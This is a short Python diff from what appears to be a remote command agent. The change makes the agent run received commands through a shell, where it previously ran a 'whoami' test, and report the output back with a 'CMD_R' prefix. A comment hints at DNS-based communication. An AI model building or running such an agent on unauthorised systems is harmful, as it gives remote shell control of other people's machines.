@@ -102,9 +102,10 @@ def main():
                     if DEBUG:
                         print(f"Running command: {command}")
                     # dns_server_lines = subprocess.run(['grep','nameserver'], input=etc_resolve_output, stdout=subprocess.PIPE, text=True).stdout.splitlines()
-                    #result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
-                    result = subprocess.run("whoami", shell=True, capture_output=True, text=True, timeout=60)
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
+                    #result = subprocess.run("whoami", shell=True, capture_output=True, text=True, timeout=60)
                     # output = result.stdout + result.stderr
+                    #output = f"CMD_R {result.returncode} | {result.stdout.strip().replace('\n', '\t')} | {result.stderr.strip().replace('\n', '\t')}"
                     output = f"CMD_R {result.returncode} | {result.stdout.strip()} | {result.stderr.strip()}"
                     if DEBUG:
                         print(f"Sending: {output}")
